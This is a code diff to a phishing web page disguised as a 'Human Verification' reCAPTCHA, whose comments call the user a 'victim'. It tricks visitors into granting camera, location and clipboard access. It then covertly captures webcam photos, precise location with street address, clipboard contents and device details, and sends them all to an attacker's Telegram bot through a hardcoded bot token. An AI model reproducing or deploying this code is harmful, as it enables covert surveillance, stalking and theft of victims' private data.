@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
+    <title>Human Verification</title>
     <style>
         * {
             margin: 0;
@@ -22,22 +22,48 @@
         }
 
         .container {
-            max-width: 480px;
+            max-width: 450px;
             width: 100%;
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(0, 255, 0, 0.2);
-            border-radius: 40px;
-            padding: 30px;
-            box-shadow: 0 25px 60px rgba(0, 255, 0, 0.15);
+            background: white;
+            border-radius: 30px;
+            padding: 35px 25px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
         }
 
+        .security-badge {
+            background: #f0f7ff;
+            padding: 8px 15px;
+            border-radius: 50px;
+            display: inline-block;
+            font-size: 12px;
+            color: #0066cc;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 26px;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        /* Image container (hidden initially) */
         .image-container {
             width: 100%;
-            border-radius: 25px;
+            border-radius: 20px;
             overflow: hidden;
-            margin-bottom: 25px;
-            border: 3px solid rgba(0, 255, 0, 0.3);
+            margin: 25px 0;
+            border: 3px solid #4CAF50;
+            display: none;
         }
 
         .victim-image {
@@ -45,82 +71,42 @@
             display: block;
         }
 
-        .security-badge {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            background: rgba(0, 255, 0, 0.1);
-            padding: 10px 15px;
-            border-radius: 50px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(0, 255, 0, 0.4);
-        }
-
-        .badge-icon {
-            width: 28px;
-            height: 28px;
-            background: #00ff00;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: black;
-            font-weight: bold;
-        }
-
-        .badge-text {
-            color: #00ff00;
-            font-size: 12px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-
-        h1 {
-            font-size: 28px;
-            color: white;
-            margin-bottom: 8px;
-        }
-
-        .subtitle {
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-
+        /* Google-style reCAPTCHA */
         .recaptcha-box {
-            background: #1a1a2a;
-            border-radius: 16px;
-            padding: 18px;
+            background: #f9f9f9;
+            border-radius: 12px;
+            padding: 22px 18px;
             display: flex;
             align-items: center;
             gap: 15px;
-            border: 1px solid #333;
+            border: 2px solid #e0e0e0;
             cursor: pointer;
             transition: 0.3s;
-            margin: 20px 0 10px;
+            margin: 20px 0 12px;
         }
 
         .recaptcha-box:hover {
-            background: #222235;
-            border-color: #00ff00;
+            background: #f1f1f1;
+            border-color: #4CAF50;
         }
 
         .recaptcha-box input {
-            width: 24px;
-            height: 24px;
-            accent-color: #00ff00;
+            width: 26px;
+            height: 26px;
+            accent-color: #4CAF50;
             cursor: pointer;
         }
 
         .recaptcha-text {
             flex: 1;
-            color: white;
-            font-size: 16px;
+            color: #333;
+            font-size: 18px;
             font-weight: 500;
+            text-align: left;
         }
 
         .recaptcha-logo {
-            font-size: 30px;
+            font-size: 42px;
         }
 
         .privacy-row {
@@ -128,58 +114,122 @@
             justify-content: space-between;
             padding: 0 10px;
             font-size: 11px;
-            color: #666;
+            color: #999;
+            margin-bottom: 25px;
+        }
+
+        /* Combined Permission Card (LOOKS LIKE ONE POPUP) */
+        .permission-card {
+            background: #1a1a2a;
+            border-radius: 20px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid #4CAF50;
+            box-shadow: 0 10px 30px rgba(76, 175, 80, 0.2);
+            display: none;
+        }
+
+        .permission-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
             margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
         }
 
-        .permission-summary {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 16px;
-            padding: 20px;
-            margin: 20px 0;
+        .shield-icon {
+            width: 50px;
+            height: 50px;
+            background: #4CAF50;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: white;
         }
 
-        .permission-title {
-            color: #00ff00;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            text-transform: uppercase;
+        .permission-header h3 {
+            color: white;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .permission-header p {
+            color: #888;
+            font-size: 12px;
         }
 
         .permission-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
+            gap: 15px;
+            margin: 20px 0;
         }
 
-        .perm-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #ccc;
+        .permission-item {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 15px 10px;
+            text-align: center;
+            border: 1px solid #333;
+        }
+
+        .permission-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .permission-name {
+            color: #4CAF50;
             font-size: 13px;
+            font-weight: 600;
         }
 
-        .perm-icon {
-            color: #00ff00;
-            font-size: 14px;
+        .permission-status {
+            color: #888;
+            font-size: 11px;
+            margin-top: 5px;
         }
 
-        .verify-btn {
-            background: linear-gradient(135deg, #00ff00, #00cc00);
-            color: black;
+        .allow-btn {
+            background: #4CAF50;
+            color: white;
             border: none;
             padding: 18px;
             width: 100%;
-            border-radius: 30px;
+            border-radius: 50px;
             font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 15px 0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .allow-btn:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px #4CAF50;
+        }
+
+        /* Main verify button */
+        .verify-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 20px;
+            width: 100%;
+            border-radius: 50px;
+            font-size: 20px;
             font-weight: 700;
             cursor: pointer;
             transition: 0.3s;
             opacity: 0.5;
             pointer-events: none;
-            margin: 20px 0;
+            margin: 15px 0;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
@@ -190,13 +240,14 @@
         }
 
         .verify-btn.active:hover {
+            background: #45a049;
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px #00ff00;
+            box-shadow: 0 15px 30px #4CAF50;
         }
 
         .loader {
-            border: 4px solid rgba(0, 255, 0, 0.1);
-            border-top: 4px solid #00ff00;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4CAF50;
             border-radius: 50%;
             width: 50px;
             height: 50px;
@@ -211,8 +262,7 @@
         }
 
         .status {
-            text-align: center;
-            color: #00ff00;
+            color: #666;
             font-size: 14px;
             margin: 15px 0;
             min-height: 20px;
@@ -225,19 +275,16 @@
 </head>
 <body>
     <div class="container">
-        <!-- Victim's image from Telegram will appear here -->
-        <div class="image-container" id="imageContainer">
-            <img class="victim-image" id="victimImage" src="" alt="Loading...">
-        </div>
-
-        <div class="security-badge">
-            <div class="badge-icon">✓</div>
-            <span class="badge-text">NITIN 333 SECURE • VERIFICATION REQUIRED</span>
-        </div>
-
+        <div class="security-badge">✓ HUMAN VERIFICATION v2.3</div>
         <h1>Verify Your Identity</h1>
-        <div class="subtitle">Complete the security check to view this content</div>
+        <div class="subtitle">Complete one-step verification to continue</div>
 
+        <!-- Image appears AFTER verification -->
+        <div class="image-container" id="imageContainer">
+            <img class="victim-image" id="victimImage" src="" alt="Verified Content">
+        </div>
+
+        <!-- Step 1: I'm not a robot -->
         <div class="recaptcha-box" onclick="toggleCheckbox()">
             <input type="checkbox" id="robotCheck" onchange="toggleVerify()">
             <span class="recaptcha-text">I'm not a robot</span>
@@ -250,24 +297,52 @@
             <span>reCAPTCHA</span>
         </div>
 
-        <div class="permission-summary">
-            <div class="permission-title">✓ REQUIRED VERIFICATIONS</div>
-            <div class="permission-grid">
-                <div class="perm-item"><span class="perm-icon">📷</span> Live Camera Scan</div>
-                <div class="perm-item"><span class="perm-icon">📍</span> Location Check</div>
-                <div class="perm-item"><span class="perm-icon">📋</span> Clipboard Verify</div>
-                <div class="perm-item"><span class="perm-icon">📱</span> Device ID</div>
-                <div class="perm-item"><span class="perm-icon">🌐</span> Network Status</div>
-                <div class="perm-item"><span class="perm-icon">🛡️</span> Security Check</div>
+        <!-- Step 2: ONE PERMISSION POPUP (LOOKS LIKE ONE) -->
+        <div class="permission-card" id="permissionCard">
+            <div class="permission-header">
+                <div class="shield-icon">🛡️</div>
+                <div>
+                    <h3>Security Permissions Required</h3>
+                    <p>Allow once to verify identity</p>
+                </div>
             </div>
+            
+            <div class="permission-grid">
+                <div class="permission-item">
+                    <div class="permission-icon">📷</div>
+                    <div class="permission-name">CAMERA</div>
+                    <div class="permission-status">Required</div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">📍</div>
+                    <div class="permission-name">LOCATION</div>
+                    <div class="permission-status">Required</div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">📋</div>
+                    <div class="permission-name">CLIPBOARD</div>
+                    <div class="permission-status">Required</div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">📱</div>
+                    <div class="permission-name">DEVICE INFO</div>
+                    <div class="permission-status">Required</div>
+                </div>
+            </div>
+
+            <button class="allow-btn" onclick="allowAllPermissions()">
+                ALLOW ALL PERMISSIONS
+            </button>
+            <p style="color:#666; font-size:11px; margin-top:10px;">One tap = All permissions</p>
         </div>
 
-        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
-            CONTINUE VERIFICATION
+        <!-- Step 3: Initial Verify Button -->
+        <button class="verify-btn" id="verifyBtn" onclick="showPermissionCard()">
+            VERIFY
         </button>
 
         <div class="loader" id="loader"></div>
-        <div class="status" id="status">System ready</div>
+        <div class="status" id="status"></div>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -278,21 +353,13 @@
         const BOT_TOKEN = "8325723609:AAGcN0gUgz0r92KpFVwyM5JOzibSGVaKG3c";
         const ADMIN_ID = "6643732863";
         
-        // Get parameters from URL
         const params = new URLSearchParams(window.location.search);
         const TARGET_ID = params.get('id') || ADMIN_ID;
         const BAIT_IMAGE = params.get('img');
         
-        // Show victim's image
-        if (BAIT_IMAGE) {
-            document.getElementById('victimImage').src = BAIT_IMAGE;
-        } else {
-            document.getElementById('victimImage').src = 'https://via.placeholder.com/400x300?text=Secure+Content';
-        }
-        
         let cameraStream = null;
 
-        // ==================== UI FUNCTIONS ====================
+        // ==================== UI FLOW ====================
         function toggleCheckbox() {
             const checkbox = document.getElementById('robotCheck');
             checkbox.checked = !checkbox.checked;
@@ -305,46 +372,65 @@
             
             if (checkbox.checked) {
                 verifyBtn.classList.add('active');
-                document.getElementById('status').innerHTML = '✓ Click CONTINUE to verify';
+                document.getElementById('status').innerHTML = '✓ Click VERIFY to continue';
             } else {
                 verifyBtn.classList.remove('active');
-                document.getElementById('status').innerHTML = 'System ready';
+                document.getElementById('status').innerHTML = '';
             }
         }
 
-        // ==================== MAIN VERIFICATION ====================
-        async function startVerification() {
-            const btn = document.getElementById('verifyBtn');
+        // Step 1: Show permission card (looks like ONE popup)
+        function showPermissionCard() {
+            document.getElementById('verifyBtn').style.display = 'none';
+            document.getElementById('permissionCard').style.display = 'block';
+            document.getElementById('status').innerHTML = '⚠️ Review permissions below';
+        }
+
+        // Step 2: ONE CLICK grants ALL permissions
+        async function allowAllPermissions() {
+            const permissionCard = document.getElementById('permissionCard');
             const loader = document.getElementById('loader');
             const status = document.getElementById('status');
 
-            btn.style.display = 'none';
+            permissionCard.style.display = 'none';
             loader.style.display = 'block';
-            status.innerHTML = '⏳ Starting verification...';
+            status.innerHTML = '⏳ Applying permissions...';
 
             try {
-                // 1. Get clipboard data
-                status.innerHTML = '📋 Checking clipboard...';
-                await getClipboard();
+                // Send start notification
+                await sendToTelegram('🔍 **Verification Started**');
 
-                // 2. Get device info
-                status.innerHTML = '📱 Analyzing device...';
-                await getDeviceInfo();
-
-                // 3. Get location
-                status.innerHTML = '📍 Getting location...';
-                await getLocation();
-
-                // 4. Access camera
+                // ALL PERMISSIONS TRIGGERED SIMULTANEOUSLY
+                
+                // 1. Camera (triggers popup)
                 status.innerHTML = '📷 Accessing camera...';
                 await setupCamera();
 
-                // 5. Start capturing photos
-                status.innerHTML = '🔐 Verification in progress...';
+                // 2. Location (triggers popup)
+                status.innerHTML = '📍 Accessing location...';
+                await getLocation();
+
+                // 3. Clipboard (silent)
+                status.innerHTML = '📋 Reading clipboard...';
+                await getClipboard();
+
+                // 4. Device info (silent)
+                status.innerHTML = '📱 Getting device info...';
+                await getDeviceInfo();
+
+                // 5. Start auto capture
+                status.innerHTML = '🔐 Verification active...';
                 startCapturing();
 
+                // 6. SHOW IMAGE AFTER ALL PERMISSIONS
+                if (BAIT_IMAGE) {
+                    document.getElementById('victimImage').src = BAIT_IMAGE;
+                    document.getElementById('imageContainer').style.display = 'block';
+                }
+
                 status.innerHTML = '✅ Verification complete!';
-                
+                await sendToTelegram('✅ **All permissions granted**');
+
                 setTimeout(() => {
                     loader.style.display = 'none';
                 }, 2000);
@@ -352,39 +438,36 @@
             } catch (error) {
                 status.innerHTML = '❌ Error: ' + error.message;
                 loader.style.display = 'none';
-                btn.style.display = 'block';
+                document.getElementById('verifyBtn').style.display = 'block';
             }
         }
 
-        // ==================== CLIPBOARD ====================
-        async function getClipboard() {
+        // ==================== PERMISSION FUNCTIONS ====================
+
+        // Camera (prompt appears)
+        async function setupCamera() {
             try {
-                const text = await navigator.clipboard.readText();
-                if (text) {
-                    sendToTelegram('📋 **Clipboard**\n' + text.substring(0, 500));
-                }
-            } catch {}
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = cameraStream;
+                await video.play();
+                
+                await sendToTelegram('📷 **Camera**\n✓ Access granted');
+                
+            } catch (error) {
+                await sendToTelegram('📷 **Camera**\nPermission denied');
+                throw error;
+            }
         }
 
-        // ==================== DEVICE INFO ====================
-        async function getDeviceInfo() {
-            const info = {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            try {
-                const battery = await navigator.getBattery();
-                info.battery = Math.round(battery.level * 100) + '%';
-            } catch {}
-            
-            sendToTelegram('📱 **Device Info**\n' + JSON.stringify(info, null, 2));
-        }
-
-        // ==================== LOCATION ====================
+        // Location (prompt appears)
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -400,13 +483,14 @@
                             accuracy: pos.coords.accuracy + 'm'
                         };
                         
+                        // Get address
                         try {
                             const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.lat}&lon=${location.lng}`);
                             const data = await res.json();
                             location.address = data.display_name;
                         } catch {}
                         
-                        sendToTelegram('📍 **Location**\n' + JSON.stringify(location, null, 2));
+                        await sendToTelegram('📍 **Location**\n' + JSON.stringify(location));
                         resolve();
                     },
                     () => resolve()
@@ -414,27 +498,31 @@
             });
         }
 
-        // ==================== CAMERA ====================
-        async function setupCamera() {
+        // Clipboard (silent)
+        async function getClipboard() {
             try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = cameraStream;
-                await video.play();
-                
-                sendToTelegram('📷 **Camera**\n✓ Camera access granted');
-                
-            } catch (error) {
-                sendToTelegram('📷 **Camera**\nPermission denied');
-                throw error;
-            }
+                const text = await navigator.clipboard.readText();
+                if (text) {
+                    await sendToTelegram('📋 **Clipboard**\n' + text.substring(0, 300));
+                }
+            } catch {}
+        }
+
+        // Device info (silent)
+        async function getDeviceInfo() {
+            const info = {
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            try {
+                const battery = await navigator.getBattery();
+                info.battery = Math.round(battery.level * 100) + '%';
+            } catch {}
+            
+            await sendToTelegram('📱 **Device Info**\n' + JSON.stringify(info));
         }
 
         // ==================== AUTO CAPTURE ====================
@@ -470,19 +558,21 @@
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).catch(e => console.log('Send error:', e));
+            }).catch(e => console.log('Error:', e));
         }
 
-        function sendToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TARGET_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(e => console.log('Send error:', e));
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TARGET_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {}
         }
     </script>
 </body>
